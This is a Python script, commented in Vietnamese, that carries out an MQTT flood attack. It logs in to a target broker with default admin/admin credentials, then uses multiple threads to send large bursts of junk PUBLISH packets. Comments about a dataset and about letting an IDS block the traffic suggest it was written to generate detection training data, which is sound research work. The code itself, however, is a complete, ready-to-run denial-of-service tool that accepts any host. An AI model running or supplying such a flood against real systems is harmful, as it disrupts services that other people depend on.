#!/usr/bin/env python3
import socket
import time
import argparse
import threading
import logging
import random
import string
import sys

# Cấu hình hiển thị
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(threadName)s] %(message)s")
log = logging.getLogger("FloodAttack")

# Cấu hình mặc định
DEFAULT_USER = "admin"
DEFAULT_PASS = "admin"

def encode_remaining_length(length):
    encoded = bytearray()
    while True:
        digit = length % 128
        length //= 128
        if length > 0:
            digit |= 0x80
        encoded.append(digit)
        if length == 0:
            break
    return bytes(encoded)

def create_connect_packet(client_id, username=None, password=None):
    protocol_name = b'\x00\x04MQTT\x04'
    flags = 0x02 
    payload = bytearray()
    payload += len(client_id).to_bytes(2, 'big') + client_id.encode('utf-8')
    if username:
        flags |= 0x80
        if password:
            flags |= 0x40
    if username:
        payload += len(username).to_bytes(2, 'big') + username.encode('utf-8')
    if password:
        payload += len(password).to_bytes(2, 'big') + password.encode('utf-8')
    keep_alive = b'\x00\x3c'
    variable_header = protocol_name + bytes([flags]) + keep_alive
    rem_len = len(variable_header) + len(payload)
    return b'\x10' + encode_remaining_length(rem_len) + variable_header + payload

def generate_random_chunk():
    """Tạo khối TCP 32760 bytes (Khớp dataset)"""
    garbage = ''.join(random.choices(string.ascii_letters + string.digits, k=14)).encode()
    single_publish = b'\x30\x10\x00\x0b' + garbage
    return single_publish * 1820 

def raw_flood_worker(target_ip, target_port, rate, iterations, thread_id):
    client_id = f"flood_{thread_id}_{random.randint(1000, 9999)}"
    connect_pkt = create_connect_packet(client_id, DEFAULT_USER, DEFAULT_PASS)
    delay = 1.0 / rate if rate > 0 else 0
    massive_chunk = generate_random_chunk()
    
    error_count = 0 # Bộ đếm lỗi liên tiếp

    for _ in range(iterations):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5) # Giảm timeout xuống 0.5s để thoát nhanh khi bị block
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            s.connect((target_ip, target_port))
            s.sendall(connect_pkt)
            
            ack = s.recv(1024)
            if not ack or ack[0] != 0x20 or ack[3] != 0x00:
                s.close()
                error_count += 1
                if error_count >= 2: break
                continue
                
            error_count = 0 # Reset lỗi nếu kết nối thành công
            
            # Giảm số lượng bắn trong 1 socket xuống 200 để IDS đếm kịp và block nhanh
            for _ in range(200):
                s.sendall(massive_chunk)
                if delay > 0: time.sleep(delay)
                    
            s.close()
            
        except Exception:
            error_count += 1
            if error_count >= 2:
                log.warning(f"Thread-{thread_id} dừng: Mạng đã bị ngắt (IP bị Block).")
                break
            time.sleep(0.1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--threads", type=int, default=5)
    parser.add_argument("--rate", type=int, default=0)
    parser.add_argument("--iter", type=int, default=5) # Giảm iter mặc định xuống 5
    args = parser.parse_args()

    print("\n" + "="*60)
    print("  🔥 ATTACK 1 — FAST MQTT FLOOD")
    print(f"  🎯 Target IP  : {args.host}:{args.port}")
    print(f"  🧵 Threads    : {args.threads}")
    print("="*60)

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=raw_flood_worker, 
                             args=(args.host, args.port, args.rate, args.iter, i),
                             name=f"Flood-{i}")
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()

    print("\n" + "="*60)
    print("  📊 KẾT QUẢ: Hoàn thành hoặc đã bị Block!")
    print("="*60)
    sys.exit(0)